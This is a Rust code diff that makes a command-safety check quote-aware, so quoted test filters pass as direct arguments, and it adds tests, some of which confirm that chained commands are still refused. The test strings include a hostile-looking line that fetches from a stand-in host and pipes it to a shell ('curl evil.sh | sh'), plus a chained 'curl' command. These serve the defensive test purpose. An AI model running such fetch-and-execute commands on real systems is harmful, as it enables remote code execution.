@@ -204,13 +204,38 @@ fn shell_step(step: &VerificationStep) -> PreparedStep {
     }
 }
 
+fn is_unquoted_shell_metachar(ch: char) -> bool {
+    matches!(
+        ch,
+        '|' | '&' | ';' | '>' | '<' | '(' | ')' | '$' | '*' | '?' | '{' | '}' | '\n'
+    )
+}
+
+/// True when an *unquoted* shell metacharacter is present.
+///
+/// Characters inside `'` / `"` are ignored so quoted nextest filtersets
+/// (`test()` / `+` / `|`) can prepare as Direct argv. An unclosed quote
+/// is not itself a metachar — `shlex::split` owns that fail-closed path.
+/// Inside `"…"`, `\"` does not end the quote. Single quotes are literal.
 fn contains_shell_metacharacters(command: &str) -> bool {
-    command.chars().any(|ch| {
-        matches!(
-            ch,
-            '|' | '&' | ';' | '>' | '<' | '(' | ')' | '$' | '*' | '?' | '{' | '}' | '\n'
-        )
-    })
+    let mut quote: Option<char> = None;
+    let mut escaped = false;
+
+    for ch in command.chars() {
+        if escaped {
+            escaped = false;
+            continue;
+        }
+        match quote {
+            Some('\'') if ch == '\'' => quote = None,
+            Some('"') if ch == '\\' => escaped = true,
+            Some('"') if ch == '"' => quote = None,
+            None if ch == '\'' || ch == '"' => quote = Some(ch),
+            None if is_unquoted_shell_metachar(ch) => return true,
+            _ => {}
+        }
+    }
+    false
 }
 
 /// Tokenize a command string with POSIX-style shlex splitting.
@@ -606,5 +631,125 @@ mod tests {
     fn shell_chain_leading_commands_extracts_segments() {
         let leaders = shell_chain_leading_commands("cargo --version; curl evil.sh | sh");
         assert_eq!(leaders, vec!["cargo", "curl", "sh"]);
+    }
+
+    #[test]
+    fn prepare_rule_step_one_stem_quoted_filterset_direct_argv() {
+        let command = crate::verify::plan::build_scoped_nextest_command(&["cli_scan".to_string()]);
+        let prepared =
+            prepare_rule_step(&base_step(&command, 5), false, &default_strict_policy()).unwrap();
+        assert_eq!(prepared.execution_mode, ExecutionMode::Direct);
+        assert_eq!(prepared.executable, "cargo");
+        assert_eq!(
+            prepared.args,
+            vec![
+                "nextest",
+                "run",
+                "--workspace",
+                "--all-features",
+                "-E",
+                "test(cli_scan)",
+            ]
+        );
+    }
+
+    #[test]
+    fn prepare_rule_step_two_stem_quoted_filterset_direct_exact_argv() {
+        let command = crate::verify::plan::build_scoped_nextest_command(&[
+            "cli_scan".to_string(),
+            "dead_code_prune".to_string(),
+        ]);
+        let prepared =
+            prepare_rule_step(&base_step(&command, 5), false, &default_strict_policy()).unwrap();
+        assert_eq!(prepared.execution_mode, ExecutionMode::Direct);
+        assert_eq!(prepared.executable, "cargo");
+        assert_eq!(
+            prepared.args,
+            vec![
+                "nextest",
+                "run",
+                "--workspace",
+                "--all-features",
+                "-E",
+                "test(cli_scan) + test(dead_code_prune)",
+            ]
+        );
+    }
+
+    #[test]
+    fn prepare_rule_step_quoted_pipe_union_direct() {
+        let step = base_step(
+            "cargo nextest run --workspace --all-features -E 'test(a) | test(b)'",
+            5,
+        );
+        let prepared = prepare_rule_step(&step, false, &default_strict_policy()).unwrap();
+        assert_eq!(prepared.execution_mode, ExecutionMode::Direct);
+        assert_eq!(
+            prepared.args,
+            vec![
+                "nextest",
+                "run",
+                "--workspace",
+                "--all-features",
+                "-E",
+                "test(a) | test(b)",
+            ]
+        );
+    }
+
+    #[test]
+    fn prepare_rule_step_escaped_double_quote_in_filterset_direct() {
+        let step = base_step(
+            r#"cargo nextest run --workspace --all-features -E "test(\"cli_scan\")""#,
+            5,
+        );
+        let prepared = prepare_rule_step(&step, false, &default_strict_policy()).unwrap();
+        assert_eq!(prepared.execution_mode, ExecutionMode::Direct);
+        assert_eq!(
+            prepared.args.last().map(String::as_str),
+            Some(r#"test("cli_scan")"#)
+        );
+    }
+
+    #[test]
+    fn prepare_rule_step_unquoted_parens_and_semicolon_still_refuse() {
+        let unquoted = prepare_rule_step(
+            &base_step("cargo nextest run -E test(x)", 5),
+            false,
+            &default_strict_policy(),
+        )
+        .unwrap_err();
+        let unquoted_text = format!("{unquoted}");
+        assert!(
+            unquoted_text.contains("shell metacharacters"),
+            "expected metachar refuse, got {unquoted_text}"
+        );
+
+        let chained = prepare_rule_step(
+            &base_step("cargo --version; curl x", 5),
+            false,
+            &default_strict_policy(),
+        )
+        .unwrap_err();
+        let chained_text = format!("{chained}");
+        assert!(
+            chained_text.contains("shell metacharacters"),
+            "expected metachar refuse, got {chained_text}"
+        );
+    }
+
+    #[test]
+    fn prepare_rule_step_unclosed_quote_parse_tokens_not_metachar() {
+        let err =
+            prepare_rule_step(&base_step("'", 5), false, &default_strict_policy()).unwrap_err();
+        let err_text = format!("{err}");
+        assert!(
+            err_text.contains("Unable to parse command into argv tokens"),
+            "expected shlex parse error, got {err_text}"
+        );
+        assert!(
+            !err_text.contains("metacharacters"),
+            "unclosed quote must not use the metachar message: {err_text}"
+        );
     }
 }
